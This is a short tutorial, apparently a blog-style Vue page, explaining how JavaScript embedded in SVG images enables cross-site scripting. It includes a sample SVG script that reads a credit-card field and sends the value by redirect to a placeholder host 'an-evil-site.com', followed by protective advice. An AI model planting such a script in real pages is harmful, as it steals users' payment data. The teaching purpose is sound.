<template>
  <article class="snippet-article">
    <h1 class="hero-title">How SVGs Can Be Dangerous</h1>
    
    <p>
      Scalable Vector Graphics (SVGs) are XML documents that describe images as mathematical formulas. Because of this, the images that are drawn by the browser using these formulas never lose quality at any size.
    </p>

    <p>
      Here are the contents of a simple SVG document that describe a green circle:
    </p>

    <pre v-highlightjs><code class="html">
      &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
        &lt;circle cx="40" cy="40" r="24" style="stroke:#006600; fill:#00cc00"/&gt;
      &lt;/svg&gt;
    </code></pre>

    <p>How it looks visually:</p>
    <img src="https://i.ibb.co/ZX9Sg35/C-Users-Bill-Downloads-circle-svg.png" style="width: 40px;">

    <p>
      While SVGs offer certain benefits over raster-based image formats such as scalability, interactivity, editability and small file sizes, there is a way in which SVGs can be used for evil. 👿
    </p>

    <p>
      Since SVGs have their own document object model (DOM), just like an HTML document, they can function as an interactive document. How? Well it's simple - anyone can just throw in some JavaScript:
    </p>

    <pre v-highlightjs><code class="html">
      &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
        &lt;script>alert('I can do evil things...');&lt;/script&gt;
        &lt;circle cx="40" cy="40" r="24" style="stroke:#006600; fill:#00cc00"/&gt;
      &lt;/svg&gt;
    </code></pre>

    <p>
      If we open this SVG document with our browser we can see the JavaScript execute immediately. The alert even blocks execution of the browser rendering the circle.
    </p>

    <img src="https://res.cloudinary.com/dormh2fvt/image/upload/v1596769775/JS%20Bits/chrome_2LS5UxcEf1.png">

    <p>
      While adding JS inside an SVG isn't inherently dangerous, it's important to know how they <i>could</i> be exploited. 
    </p>
    
    <p>
      Consider this scenario - a forum allows any user to upload a profile picture in SVG format. The hacker can add a script that retrieves cookie/storage information and force the browser to redirect to their own server with query params containing the retrieved data. If this SVG profile picture is embedded on the site, and is viewed by anyone, then that malicious script will run before the user even realizes what has happened. Such an attack is a form of Cross-Site Scripting (XSS) and the possibilities for exploitation are numerous:
    </p>

    <pre v-highlightjs><code class="html">
      &lt;h3&gt;Enter Your Payment Info&lt;/h3&gt;
      &lt;input id="credit-card"&gt;

      &lt;div class="customer-pic"&gt;
        &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
          &lt;script&gt;
            const evilSite = 'http://www.an-evil-site.com';
            const ccInput = document.querySelector('#credit-card');
            ccInput.onchange = () => {
              window.location.href = `${evilSite}?cc=${ccInput.value}`;
            }; 
          &lt;/script&gt;
          &lt;circle cx="40" cy="40" r="24"&gt;&lt;/circle&gt;
        &lt;/svg&gt;
      &lt;/div&gt;
    </code></pre>

    <p>
      Let's stop right here and clear the big question though — when the SVG is implemented as an image tag or CSS background image source, <b>the browser will not execute any JavaScript embedded inside the SVG</b>. So the following implementations would be safe:
    </p>

    <pre v-highlightjs><code class="html">
      &lt;img src="./circle.svg"&gt;
    </code></pre>
    <br>
    <pre v-highlightjs><code class="css">
      div {
        background-image: url("./circle.svg");
      }
    </code></pre>

    <p>
      But if these trojan SVGs are embedded directly or added with an iframe then <b>bad things can happen</b>. 🚨
    </p>

    <p>So how can you protect against such a nefarious exploit?</p>

    <ul>
      <li>Don't allow SVG uploads from untrusted sources.</li>
      <li>Consider a Content Security Policy (CSP) to protect against XSS.</li>
      <li>Don't store sensitive data client-side.</li>
      <li>Use secure frames to capture sensitive client input.</li>
    </ul>

  </article>
</template>
